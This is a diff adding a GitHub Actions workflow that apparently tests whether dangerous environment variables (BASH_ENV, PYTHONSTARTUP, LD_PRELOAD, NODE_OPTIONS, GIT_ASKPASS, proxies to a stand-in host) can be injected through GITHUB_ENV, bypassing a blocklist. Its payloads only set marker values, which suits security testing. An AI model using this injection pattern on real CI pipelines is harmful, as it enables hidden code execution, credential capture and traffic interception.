@@ -1,0 +1,46 @@
+name: Comprehensive Env Injection Test
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Step 1 — set dangerous env vars
+        run: |
+          # Set multiple code-execution env vars
+          echo "BASH_ENV=/tmp/bash_payload.sh" >> $GITHUB_ENV
+          echo "PYTHONSTARTUP=/tmp/python_payload.py" >> $GITHUB_ENV
+          echo "LD_PRELOAD=/tmp/fake.so" >> $GITHUB_ENV
+          echo "http_proxy=http://role-a-proxy.example.com:8080" >> $GITHUB_ENV
+          echo "https_proxy=http://role-a-proxy.example.com:8080" >> $GITHUB_ENV
+          echo "GIT_ASKPASS=/tmp/git_cred_capture.sh" >> $GITHUB_ENV
+          echo "NODE_OPTIONS=--require=/tmp/node_payload.js" >> $GITHUB_ENV
+          
+          # Create payload files
+          echo 'export BASH_INJECTED=YES_BASH_WORKS' > /tmp/bash_payload.sh
+          echo 'import os; os.environ["PYTHON_INJECTED"] = "YES_PYTHON_WORKS"' > /tmp/python_payload.py
+          echo '#!/bin/sh' > /tmp/git_cred_capture.sh
+          echo 'echo "GIT_ASKPASS_INJECTED=YES"' >> /tmp/git_cred_capture.sh
+          chmod +x /tmp/git_cred_capture.sh
+          
+          echo "Step 1: Set 7 dangerous env vars via GITHUB_ENV"
+
+      - name: Step 2 — check which ones are active
+        run: |
+          echo "=== Blocklist bypass results ==="
+          echo "BASH_ENV=$BASH_ENV"
+          echo "BASH_INJECTED=$BASH_INJECTED"
+          echo "PYTHONSTARTUP=$PYTHONSTARTUP"
+          echo "LD_PRELOAD=$LD_PRELOAD"
+          echo "http_proxy=$http_proxy"
+          echo "https_proxy=$https_proxy"
+          echo "GIT_ASKPASS=$GIT_ASKPASS"
+          echo "NODE_OPTIONS=$NODE_OPTIONS"
+
+      - name: Step 3 — test Python startup
+        run: |
+          python3 -c "import os; print('PYTHON_INJECTED=' + os.environ.get('PYTHON_INJECTED', 'NOT_SET'))"
